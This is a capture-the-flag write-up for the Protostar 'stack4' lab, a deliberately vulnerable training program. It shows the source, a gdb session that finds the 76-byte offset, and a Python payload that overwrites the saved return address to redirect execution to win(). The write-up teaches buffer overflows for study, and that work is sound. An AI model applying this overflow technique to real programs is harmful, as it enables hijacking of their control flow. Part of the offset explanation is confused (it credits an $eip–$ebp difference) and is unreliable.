```
TL;DR -> ` python -c "print 'A'*76 + '\xf4\x83\x04\x08'" | ./stack4`
```

# Stack4

URL: https://exploit.education/protostar/stack-four/
Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints

- A variety of introductory papers into buffer overflows may help.
  gdb lets you do “run < input”
  EIP is not directly after the end of buffer, compiler padding can also increase the size.

Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

# Writeup

Here, we have to find the padding. I have done that using `$ebp` and `$eip` pointer.

```
user@protostar:/opt/protostar/bin$ gdb ./stack4
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) r
Starting program: /opt/protostar/bin/stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program exited with code 0160.
(gdb) info frame
No stack.
(gdb) info frames
Undefined info command: "frames".  Try "help info".
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
(gdb) break *0x0804841d
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) r
Starting program: /opt/protostar/bin/stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) info frame
Stack level 0, frame at 0xbffff7c0:
 eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eadc76
 source language c.
 Arglist at 0xbffff7b8, args: argc=1, argv=0xbffff864
 Locals at 0xbffff7b8, Previous frame's sp is 0xbffff7c0
 Saved registers:
  ebp at 0xbffff7b8, eip at 0xbffff7bc
(gdb) x/24x $esp
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x08048400      0x00000000      0xbffff838      0xb7eadc76
(gdb)
```

The `$eip` pointer is `0xbffff7bc` and the stack starts from `0xbffff7bc` as the hex value for `A` is `0x41`.

Getting the difference of `$eip` and `$ebp` will give use the length of payload, that is `76`.

At last, appending the `win` function address to payload will solve the problem!

You will get the address of `win` function using `x win` from GDB.

Payload: `python -c "print 'A'*76 + '\xf4\x83\x04\x08'"`

---

One liner solution:
`python -c "print 'A'*76 + '\xf4\x83\x04\x08'" | ./stack4`
